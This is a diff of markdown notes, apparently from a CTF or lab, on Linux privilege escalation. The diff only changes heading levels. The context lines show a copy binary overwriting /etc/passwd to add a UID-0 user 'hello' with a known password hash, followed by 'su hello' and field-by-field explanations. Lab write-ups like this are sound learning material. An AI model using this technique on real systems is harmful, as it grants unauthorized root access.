@@ -1,4 +1,4 @@
-## linux escalation
+# linux escalation
 from `strings passwd in /usr/bin`
 /etc/passwd
 /etc/shadow
@@ -21,7 +21,7 @@ elf@9f255a4f6bc8:/tmp/myTmp$ /usr/bin/simplecopy passwd /etc/passwd
 elf@9f255a4f6bc8:/tmp/myTmp$ su hello
 ```
 
-### Explained hello:$1$hello$OYK6k6djmHg1dIhMlFMPA/:0:0:root:/root:/bin/bash
+## Explained hello:$1$hello$OYK6k6djmHg1dIhMlFMPA/:0:0:root:/root:/bin/bash
 `hello:x:0:0:root:/root:/bin/bash`
 Username (hello): The name of the user.
 Password (x): An x indicates that the password is stored in the /etc/shadow file.
@@ -31,7 +31,7 @@ GECOS (root): The GECOS field typically contains the full name of the user, but 
 Home Directory (/root): The absolute path to the user's home directory. For the root user, this is typically /root.
 Shell (/bin/bash): The absolute path to the user's default shell. /bin/bash is the Bash shell.
 
-### Explanation of /etc/shadow Fields:
+## Explanation of /etc/shadow Fields:
 `hello:$1$hello$OYK6k6djmHg1dIhMlFMPA/:0:0:99999:7:::`
 hello: Username.
 $1$hello$OYK6k6djmHg1dIhMlFMPA/: Password hash.
